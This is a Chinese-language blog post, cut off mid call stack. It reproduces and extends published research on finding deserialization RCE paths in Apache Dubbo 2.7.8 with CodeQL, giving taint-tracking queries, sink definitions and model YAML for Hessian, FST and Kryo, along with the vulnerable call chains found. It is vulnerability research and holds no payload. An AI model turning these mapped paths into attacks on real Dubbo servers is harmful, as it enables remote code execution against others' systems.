    <content type="html"><![CDATA[<p>《Apache Dubbo: All roads lead to RCE》算是最早公开利用CodeQL 挖掘漏洞的文章，能够半自动化漏洞挖掘，难怪pwntester 祖师爷的产出能够如此高效。</p><h2 id="0x01-Dubbo背景"><a href="#0x01-Dubbo背景" class="headerlink" title="0x01 Dubbo背景"></a>0x01 Dubbo背景</h2><p>Dubbo 的漏洞原理可以参考上一篇文章。</p><p>环境：</p><ul><li>Dubbo 2.7.8</li><li>Codeql 2.13.1</li></ul><p>Codeql 一直在增加框架的支持，pwntester的这篇文章发布在2021年9月，在2023年5月2.13.1版本中，已经增加了对于Netty的Source支持。</p><a id="more"></a><h2 id="0x02-原文复现"><a href="#0x02-原文复现" class="headerlink" title="0x02 原文复现"></a>0x02 原文复现</h2><p>参考[1]</p><h3 id="2-1-Netty-Source"><a href="#2-1-Netty-Source" class="headerlink" title="2.1 Netty Source"></a>2.1 Netty Source</h3><p>by pwntester<br><img src="/images/pasted-622.png" alt="upload successful"></p><p>CodeQL v2.13.1 default<br><img src="/images/pasted-621.png" alt="upload successful"></p><p>内置的Netty Source已经更全面了。</p><p><img src="/images/pasted-632.png" alt="upload successful"></p><p><img src="/images/pasted-633.png" alt="upload successful"></p><p><img src="/images/pasted-634.png" alt="upload successful"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * @kind path-problem</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.TaintTracking</span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line">class InsecureConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">  InsecureConfig() &#123; this &#x3D; &quot;InsecureConfig&quot; &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">    exists(Method m |</span><br><span class="line">      m.getName() &#x3D; &quot;decodeBody&quot; and</span><br><span class="line">      m.getDeclaringType().hasQualifiedName(&quot;org.apache.dubbo.rpc.protocol.dubbo&quot;, &quot;DubboCodec&quot;) and</span><br><span class="line">      m.getParameter(1) &#x3D; source.asParameter()</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    exists(Call call |</span><br><span class="line">      call.getCallee().getName().matches(&quot;read%&quot;) and</span><br><span class="line">      call.getCallee()</span><br><span class="line">        .getDeclaringType()</span><br><span class="line">        .getASourceSupertype*()</span><br><span class="line">        .hasQualifiedName(&quot;org.apache.dubbo.common.serialize&quot;, &quot;ObjectInput&quot;) and</span><br><span class="line">      call.getQualifier() &#x3D; sink.asExpr()</span><br><span class="line">      and sink.getLocation().getFile().getRelativePath().matches(&quot;%DecodeableRpcInvocation%&quot;)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isAdditionalTaintStep(DataFlow::Node n1, DataFlow::Node n2) &#123;</span><br><span class="line">    exists(MethodAccess ma |</span><br><span class="line">      ma.getMethod().getName() &#x3D; &quot;deserialize&quot; and</span><br><span class="line">      ma.getMethod().getDeclaringType().hasQualifiedName(&quot;org.apache.dubbo.common.serialize&quot;, &quot;Serialization&quot;) and</span><br><span class="line">      ma.getArgument(1) &#x3D; n1.asExpr() and</span><br><span class="line">      ma &#x3D; n2.asExpr()</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from InsecureConfig conf, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where conf.hasFlowPath(source, sink)</span><br><span class="line">select sink, source, sink, &quot;unsafe deserialization&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-628.png" alt="upload successful"></p><ul><li>注意这里的s.deserialize(url, is) 是由isAdditionalTaintStep手动串起来的</li></ul><p>后续的不赘述了，参考pwntester的文章。</p><p>但是，如上面的例子，pwntester给的Additional很突兀，后续的例子也需要对Dubbo漏洞有很深的了解，才能写出对应的QL。</p><p>如何在不需要这么多背景知识情况下，用更通用的QL发现Dubbo的这些漏洞呢？</p><h2 id="0x03-GHSL-2021-036"><a href="#0x03-GHSL-2021-036" class="headerlink" title="0x03 GHSL-2021-036"></a>0x03 GHSL-2021-036</h2><blockquote><p>GHSL-2021-036<br>GHSL-2021-036 Dubbo中数据流有很多途径到达hessian#readObject，pwntester首次在这里提出这条链readUTF-&gt;readString-&gt;expect-&gt;readObject，这个和后续的CVE-2021-43297异曲同工，而且更短</p></blockquote><h3 id="3-1-Sink"><a href="#3-1-Sink" class="headerlink" title="3.1 Sink"></a>3.1 Sink</h3><p>sink 点初步感觉应该是Hessian2Input#readObject</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> override predicate isSink(DataFlow::Node sink) &#123;    </span><br><span class="line">exists( MethodAccess ma|</span><br><span class="line">     ma.getMethod().hasName(&quot;readObject&quot;)</span><br><span class="line">     and ma.getQualifier() &#x3D; sink.asExpr()</span><br><span class="line">     and ma.getReceiverType().getASourceSupertype*().hasQualifiedName(&quot;com.caucho.hessian.io&quot;, &quot;Hessian2Input&quot;)</span><br><span class="line">   )</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>实际不止如此，引用上一篇文章原理一节</p><blockquote><p>核心的逻辑在于Hessian2#readString，如果发现tag字段类型非String，会调用expect进行Exception告警，其中</p><ol><li>尝试readObject</li><li>将obj 进行“+” 拼接<br>从而触发obj.toString，造成反序列化问题</li></ol></blockquote><p>此处的sink点已经不是readObject了，鉴于CodeQL不能跟进hessian 内部，所以这里只能将readString也作为sink点。</p><p>所以最终的sink逻辑如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> override predicate isSink(DataFlow::Node sink) &#123;    </span><br><span class="line">exists( MethodAccess ma|</span><br><span class="line">     ma.getMethod().getName() in [&quot;readObject&quot;, &quot;readString&quot;]</span><br><span class="line">     and ma.getQualifier() &#x3D; sink.asExpr()</span><br><span class="line">     and ma.getReceiverType().getASourceSupertype*().hasQualifiedName(&quot;com.caucho.hessian.io&quot;, &quot;Hessian2Input&quot;)</span><br><span class="line">   )</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><ul><li>这里pwntester能够发现Hessian的readUTF这个链，说明不单单是分析Dubbo了，至少还有去单独分析Hessain</li></ul><h3 id="3-2-Additional"><a href="#3-2-Additional" class="headerlink" title="3.2 Additional"></a>3.2 Additional</h3><p>java/ql/lib/ext/com.caucho.hessian.model.yml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">extensions:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">addsTo:</span></span><br><span class="line">      <span class="attr">pack:</span> <span class="string">codeql/java-all</span></span><br><span class="line">      <span class="attr">extensible:</span> <span class="string">summaryModel</span></span><br><span class="line">    <span class="attr">data:</span></span><br><span class="line">      <span class="bullet">-</span> [<span class="string">&quot;com.caucho.hessian.io&quot;</span>, <span class="string">&quot;Hessian2Input&quot;</span>, <span class="literal">True</span>, <span class="string">&quot;Hessian2Input&quot;</span>, <span class="string">&quot;(InputStream)&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;Argument[0]&quot;</span>, <span class="string">&quot;Argument[this]&quot;</span>, <span class="string">&quot;taint&quot;</span>, <span class="string">&quot;manual&quot;</span>]</span><br><span class="line">      <span class="bullet">-</span> [<span class="string">&quot;com.caucho.hessian.io&quot;</span>, <span class="string">&quot;Hessian2Input&quot;</span>, <span class="literal">True</span>, <span class="string">&quot;init&quot;</span>, <span class="string">&quot;(InputStream)&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;Argument[0]&quot;</span>, <span class="string">&quot;Argument[this]&quot;</span>, <span class="string">&quot;taint&quot;</span>, <span class="string">&quot;manual&quot;</span>]</span><br></pre></td></tr></table></figure><h3 id="3-3-QL-Result"><a href="#3-3-QL-Result" class="headerlink" title="3.3 QL Result"></a>3.3 QL Result</h3><p>pwntester 发现的链有这么多</p><ol><li><input checked="" disabled="" type="checkbox"> HeartBeat Request-&gt; decodeHeartbeatData -&gt; decodeEventData -&gt; in.readEvent -&gt; in.readObject<br> <img src="/images/pasted-641.png" alt="upload successful"></li><li><input disabled="" type="checkbox"> Event Request-&gt; decodeEventData -&gt; in.readEvent -&gt; in.readObject</li><li><input checked="" disabled="" type="checkbox"> OK Response-&gt; DecodeableRpcResult.decode() -&gt; handleValue -&gt; readObject<br> <img src="/images/pasted-637.png" alt="upload successful"></li><li><input checked="" disabled="" type="checkbox"> OK Response-&gt; DecodeableRpcResult.decode() -&gt; handleException leads tBo readThrowable which leads to readObject<br> <img src="/images/pasted-638.png" alt="upload successful"></li><li><input disabled="" type="checkbox"> OK Response-&gt; DecodeableRpcResult.decode() -&gt; handleAttachment leads to readAttachments which leads to <code>readObject</code></li><li><input checked="" disabled="" type="checkbox"> OK HeartBeat Response-&gt; decodeHeartbeatData -&gt; decodeEventData -&gt; in.readEvent -&gt; in.readObject<br> <img src="/images/pasted-640.png" alt="upload successful"></li><li><input disabled="" type="checkbox"> OK Event Response-&gt; decodeEventData -&gt; in.readEvent -&gt; in.readObject</li><li><input checked="" disabled="" type="checkbox"> NOK Response-&gt; in.readUTF (in Hessian, readUTF can lead to readObject)<br> <img src="/images/pasted-639.png" alt="upload successful"></li></ol><h4 id="3-3-1-遗漏"><a href="#3-3-1-遗漏" class="headerlink" title="3.3.1 遗漏"></a>3.3.1 遗漏</h4><h5 id="3-3-1-1-ecodeableRpcResult-readAttachments"><a href="#3-3-1-1-ecodeableRpcResult-readAttachments" class="headerlink" title="3.3.1.1 ecodeableRpcResult#readAttachments"></a>3.3.1.1 ecodeableRpcResult#readAttachments</h5><p>DecodeableRpcResult.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DecodeableRpcResult</span> <span class="keyword">extends</span> <span class="title">AppResponse</span> <span class="keyword">implements</span> <span class="title">Codec</span>, <span class="title">Decodeable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">decode</span><span class="params">(Channel channel, InputStream input)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">            <span class="keyword">case</span> DubboCodec.RESPONSE_VALUE_WITH_ATTACHMENTS:</span><br><span class="line">                handleValue(in);</span><br><span class="line">                handleAttachment(in);</span><br><span class="line">        ...</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">handleAttachment</span><span class="params">(ObjectInput in)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            setObjectAttachments(in.readAttachments());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            rethrow(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.dubbo.common.serialize;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ObjectInput</span> <span class="keyword">extends</span> <span class="title">DataInput</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">default</span> Map&lt;String, Object&gt; <span class="title">readAttachments</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> readObject(Map.class);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>看起来DecodeableRpcResult实际上是有readAttachments 到Sink的路径的，但是实际ql结果中没有，只有handleValue/handleException</p><p>而且有DecodeableRpcInvocation-&gt;readAttachments 的路径，但是却没有DecodeableRpcResult-&gt;readAttachments 的，神奇<br><img src="/images/pasted-644.png" alt="upload successful"></p><blockquote><p>猜测：CodeQL具有相似路径，或者更短路径，就不再重复计算？</p></blockquote><p>加个黑名单过滤看看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSanitizer(DataFlow::Node node) &#123;</span><br><span class="line">  exists( Method m| m.getAParameter() &#x3D; node.asParameter() | </span><br><span class="line">    m.getName() in [&quot;handleValue&quot;, &quot;handleException&quot;]</span><br><span class="line">    and m.getDeclaringType().hasQualifiedName(&quot;org.apache.dubbo.rpc.protocol.dubbo&quot;, &quot;DecodeableRpcResult&quot;)</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="5"><li><input checked="" disabled="" type="checkbox"> OK Response-&gt; DecodeableRpcResult.decode() -&gt; handleAttachment leads to readAttachments which leads to <code>readObject</code><br> <img src="/images/pasted-645.png" alt="upload successful"></li></ol><blockquote><p>结论：CodeQL 污点分析并不会遍历所有的路径，可能更偏向于更短/更优的路径。</p></blockquote><h5 id="3-3-1-2-Codec2"><a href="#3-3-1-2-Codec2" class="headerlink" title="3.3.1.2 Codec2"></a>3.3.1.2 Codec2</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NettyCodecAdapter</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Codec2 codec;</span><br><span class="line">    <span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">InternalDecoder</span> <span class="keyword">extends</span> <span class="title">ByteToMessageDecoder</span> </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">decode</span><span class="params">(ChannelHandlerContext ctx, ByteBuf input, List&lt;Object&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">            ChannelBuffer message = <span class="keyword">new</span> NettyBackedChannelBuffer(input);</span><br><span class="line">...</span><br><span class="line">                <span class="keyword">int</span> saveReaderIndex = message.readerIndex();</span><br><span class="line">                Object msg = codec.decode(channel, message);</span><br></pre></td></tr></table></figure><p>大致逻辑</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">NettyCodecAdapter</span><br><span class="line">Codec2#decode</span><br><span class="line">    Codec#decode</span><br></pre></td></tr></table></figure><p>此处的Codec2，在最终路径中只有CodecAdapter，没有其他的</p><ul><li>ExchangeCodec</li><li>TelnetCodec</li></ul><p><img src="/images/pasted-642.png" alt="upload successful"></p><h6 id="Try-Sanitizer"><a href="#Try-Sanitizer" class="headerlink" title="Try Sanitizer"></a>Try Sanitizer</h6><blockquote><p>是否和以上问题类似？</p></blockquote><p>注释掉CodecAdapter，让污点流量不经过CodecAdapter试试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSanitizer(DataFlow::Node node) &#123;</span><br><span class="line">  node.asExpr().getFile().getRelativePath().matches(&quot;%CodecAdapter.java&quot;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再次运行发现并无结果，看来并不是3.3.1.1的类似原因</p><h6 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h6><p>实际并不是的，注意此刻message 的类型，是一个NettyBackedChannelBuffer，ExchangeCodec 并不接受此类型的InputStream，Exchange对应的是NativeJavaSerialization反序列化</p><p><img src="/images/pasted-646.png" alt="upload successful"></p><ol start="2"><li><input checked="" disabled="" type="checkbox"> Event Request-&gt; decodeEventData -&gt; in.readEvent -&gt; in.readObject<br> <img src="/images/pasted-647.png" alt="upload successful"></li><li><input checked="" disabled="" type="checkbox"> OK Event Response-&gt; decodeEventData -&gt; in.readEvent -&gt; in.readObject<br> <img src="/images/pasted-648.png" alt="upload successful"></li></ol><h6 id="Final-Sink"><a href="#Final-Sink" class="headerlink" title="Final Sink"></a>Final Sink</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSink(DataFlow::Node sink) &#123;    </span><br><span class="line">  &#x2F;&#x2F; 结论：可行, java 原生反序列化sink点</span><br><span class="line">  exists( MethodAccess ma|</span><br><span class="line">    ma.getMethod().hasName(&quot;readObject&quot;)</span><br><span class="line">    and ma.getQualifier() &#x3D; sink.asExpr()</span><br><span class="line">    and ma.getReceiverType().getASourceSupertype*().hasQualifiedName(&quot;java.io&quot;, &quot;ObjectInputStream&quot;)</span><br><span class="line">  )</span><br><span class="line">  or</span><br><span class="line">  &#x2F;&#x2F; 结论：原本不可行，增加com.caucho.hessian.model.yml规则之后可行</span><br><span class="line">  &#x2F;&#x2F; Hessian2 反序列化Sink点，不只是readObject，具体可以参考Hessian的反序列化逻辑</span><br><span class="line">  exists( MethodAccess ma|</span><br><span class="line">    ma.getMethod().getName() in [&quot;readObject&quot;, &quot;readString&quot;]</span><br><span class="line">    and ma.getQualifier() &#x3D; sink.asExpr()</span><br><span class="line">    and ma.getReceiverType().getASourceSupertype*().hasQualifiedName(&quot;com.caucho.hessian.io&quot;, &quot;Hessian2Input&quot;)</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-649.png" alt="upload successful"></p><h4 id="3-3-2-补充"><a href="#3-3-2-补充" class="headerlink" title="3.3.2 补充"></a>3.3.2 补充</h4><h2 id="0x04-GHSL-2021-035"><a href="#0x04-GHSL-2021-035" class="headerlink" title="0x04 GHSL-2021-035"></a>0x04 GHSL-2021-035</h2><blockquote><p>CVE-2021-25641<br>GHSL-2021-035 Dubbo除了支持hessian协议，还支持其他总共14协议，这些协议里面也有反序列化问题。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">2 -&gt; &quot;hessian2&quot;</span><br><span class="line">3 -&gt; &quot;java&quot;</span><br><span class="line">4 -&gt; &quot;compactedjava&quot;</span><br><span class="line">6 -&gt; &quot;fastjson&quot;</span><br><span class="line">7 -&gt; &quot;nativejava&quot;</span><br><span class="line">8 -&gt; &quot;kryo&quot;</span><br><span class="line">9 -&gt; &quot;fst&quot;</span><br><span class="line">10 -&gt; &quot;native-hessian&quot;</span><br><span class="line">11 -&gt; &quot;avro&quot;</span><br><span class="line">12 -&gt; &quot;protostuff&quot;</span><br><span class="line">16 -&gt; &quot;gson&quot;</span><br><span class="line">21 -&gt; &quot;protobuf-json&quot;</span><br><span class="line">22 -&gt; &quot;protobuf&quot;</span><br><span class="line">25 -&gt; &quot;kryo2&quot;</span><br></pre></td></tr></table></figure><p>这些里面，部分是存在反序列化漏洞</p><h3 id="4-1-Sink"><a href="#4-1-Sink" class="headerlink" title="4.1 Sink"></a>4.1 Sink</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">  &#x2F;&#x2F; Fst</span><br><span class="line">  exists( MethodAccess ma|</span><br><span class="line">    ma.getMethod().hasName(&quot;readObject&quot;)</span><br><span class="line">    and ma.getQualifier() &#x3D; sink.asExpr()</span><br><span class="line">    and ma.getReceiverType().getASourceSupertype*().hasQualifiedName(&quot;org.nustaq.serialization&quot;, &quot;FSTObjectInput&quot;)</span><br><span class="line">  )</span><br><span class="line">  &#x2F;&#x2F; Kryo</span><br><span class="line">  or </span><br><span class="line">  exists( MethodAccess ma|</span><br><span class="line">    ma.getMethod().getName() in [&quot;readClassAndObject&quot;, &quot;readObject&quot;, &quot;readObjectOrNull&quot;]</span><br><span class="line">    and ma.getArgument(0) &#x3D; sink.asExpr()</span><br><span class="line">    and ma.getReceiverType().getASourceSupertype*().hasQualifiedName(&quot;com.esotericsoftware.kryo&quot;, &quot;Kryo&quot;)</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-2-Additional"><a href="#4-2-Additional" class="headerlink" title="4.2 Additional"></a>4.2 Additional</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">addsTo:</span></span><br><span class="line">    <span class="attr">pack:</span> <span class="string">codeql/java-all</span></span><br><span class="line">    <span class="attr">extensible:</span> <span class="string">summaryModel</span></span><br><span class="line">  <span class="attr">data:</span></span><br><span class="line">    <span class="bullet">-</span> [<span class="string">&quot;org.nustaq.serialization&quot;</span>, <span class="string">&quot;FSTObjectInput&quot;</span>, <span class="literal">True</span>, <span class="string">&quot;FSTObjectInput&quot;</span>, <span class="string">&quot;(InputStream)&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;Argument[0]&quot;</span>, <span class="string">&quot;Argument[this]&quot;</span>, <span class="string">&quot;taint&quot;</span>, <span class="string">&quot;manual&quot;</span>]</span><br><span class="line">    <span class="bullet">-</span> [<span class="string">&quot;org.nustaq.serialization&quot;</span>, <span class="string">&quot;FSTObjectInput&quot;</span>, <span class="literal">True</span>, <span class="string">&quot;FSTObjectInput&quot;</span>, <span class="string">&quot;(InputStream,FSTConfiguration)&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;Argument[0]&quot;</span>, <span class="string">&quot;Argument[this]&quot;</span>, <span class="string">&quot;taint&quot;</span>, <span class="string">&quot;manual&quot;</span>]</span><br><span class="line">    <span class="bullet">-</span> [<span class="string">&quot;org.nustaq.serialization&quot;</span>, <span class="string">&quot;FSTConfiguration&quot;</span>, <span class="literal">True</span>, <span class="string">&quot;getObjectInput&quot;</span>, <span class="string">&quot;(InputStream)&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;Argument[0]&quot;</span>, <span class="string">&quot;ReturnValue&quot;</span>, <span class="string">&quot;taint&quot;</span>, <span class="string">&quot;manual&quot;</span>]</span><br></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">extensions:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">addsTo:</span></span><br><span class="line">      <span class="attr">pack:</span> <span class="string">codeql/java-all</span></span><br><span class="line">      <span class="attr">extensible:</span> <span class="string">summaryModel</span></span><br><span class="line">    <span class="attr">data:</span></span><br><span class="line">      <span class="bullet">-</span> [<span class="string">&quot;com.esotericsoftware.kryo.io&quot;</span>, <span class="string">&quot;Input&quot;</span>, <span class="literal">False</span>, <span class="string">&quot;Input&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;Argument[0]&quot;</span>, <span class="string">&quot;Argument[this]&quot;</span>, <span class="string">&quot;taint&quot;</span>, <span class="string">&quot;manual&quot;</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="4-3-QL-Result"><a href="#4-3-QL-Result" class="headerlink" title="4.3 QL Result"></a>4.3 QL Result</h3><p><img src="/images/pasted-650.png" alt="upload successful"></p><h2 id="0x05-GHSL-2021-037-GHSL-2021-038"><a href="#0x05-GHSL-2021-037-GHSL-2021-038" class="headerlink" title="0x05 GHSL-2021-037/GHSL-2021-038"></a>0x05 GHSL-2021-037/GHSL-2021-038</h2><blockquote><p>CVE-2021-30179<br>GHSL-2021-037/GHSL-2021-038 Dubbo支持动态调用，有几个特殊的函数：$invoke$invokeAsync$echo，这几个的逻辑在GenericFilter 中，这几个函数支持特定格式的参数，在还原和处理这几个函数时，支持pojo、bean、javanative等方式，会有setter/反序列化问题</p></blockquote><p>调用栈</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">toObjectImpl:35, JndiConverter (org.apache.xbean.propertyeditor)</span><br><span class="line">toObject:86, AbstractConverter (org.apache.xbean.propertyeditor)</span><br><span class="line">setAsText:59, AbstractConverter (org.apache.xbean.propertyeditor)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">realize0:469, PojoUtils (org.apache.dubbo.common.utils)</span><br><span class="line">realize:209, PojoUtils (org.apache.dubbo.common.utils)</span><br><span class="line">realize:97, PojoUtils (org.apache.dubbo.common.utils)</span><br><span class="line">invoke:86, GenericFilter (org.apache.dubbo.rpc.filter)</span><br><span class="line">invoke:81, ProtocolFilterWrapper$1 (org.apache.dubbo.rpc.protocol)</span><br><span class="line">invoke:38, ClassLoaderFilter (org.apache.dubbo.rpc.filter)</span><br><span class="line">invoke:81, ProtocolFilterWrapper$1 (org.apache.dubbo.rpc.protocol)</span><br><span class="line">invoke:41, EchoFilter (org.apache.dubbo.rpc.filter)</span><br><span class="line">invoke:81, ProtocolFilterWrapper$1 (org.apache.dubbo.rpc.protocol)</span><br><span class="line">reply:145, DubboProtocol$1 (org.apache.dubbo.rpc.protocol.dubbo)</span><br><span class="line">received:152, DubboProtocol$1 (org.apache.dubbo.rpc.protocol.dubbo)</span><br><span class="line">received:177, HeaderExchangeHandler (org.apache.dubbo.remoting.exchange.support.header)</span><br><span class="line">received:51, DecodeHandler (org.apache.dubbo.remoting.transport)</span><br><span class="line">run:57, ChannelEventRunnable 